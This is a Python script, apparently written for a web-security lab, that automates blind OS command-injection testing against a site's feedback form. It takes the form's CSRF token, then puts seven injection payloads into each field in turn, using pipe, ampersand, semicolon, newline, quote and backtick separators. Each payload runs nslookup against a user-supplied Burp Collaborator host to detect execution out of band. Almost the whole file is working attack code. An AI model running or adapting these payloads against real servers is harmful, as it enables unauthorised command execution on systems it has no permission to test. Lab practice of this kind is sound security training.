import requests
import urllib3
import sys
from bs4 import BeautifulSoup

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def cmd_inj(url):
    s = requests.Session()
    r = s.get(url+'feedback', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']

    #data = dict()
    #keys = int(input('Number of data parameters? '))
    #for i in range(0,keys):
     #   pair = input("Enter key:value - ")
     #   temp = pair.split(':')
     #   data[temp[0]] = temp[1]
    #print(data)
    #data['csrf']=csrf
    #print(data)

    data = {
      'csrf':csrf,
      'name':'asdf',
      'email':'asdf@example.com',
      'subject':'asdf',
      'message':'asdf'
    }
    #file = 1
    #f = open('./blind_redirection.txt','w+')

    collab_link = input('Enter Burp collaborator link: ')

    for k in data:
        if k != 'csrf':
            
            #print(data[k])

            cmd_tests = [
                f'|| nslookup {collab_link}; x || nslookup {collab_link} &',
                f'| nslookup {collab_link} |',
                f'& nslookup {collab_link} &',
                f'; nslookup {collab_link} ;',
                f'%0a nslookup {collab_link} %0a',
                f"' nslookup {collab_link}",
                f'`nslookup {collab_link}`'
            ]

            for cmd in cmd_tests:
                data[k] = data[k] + cmd
                #print(cmd)
                r_1 = s.post(url=url+'feedback/submit', proxies=proxies, verify=False, data=data)
                print(f"{k} - {cmd} returned {r_1.status_code}")
                               
                data[k] = data[k].replace(f'{cmd}','')
                print(data)      

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #data = sys.argv[2].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f"[-] Example: {sys.argv[0]} www.example.com ")
        sys.exit(-1)
    
    print('[-] Attempting command redirection')
    exploit = cmd_inj(url)
    #print(exploit)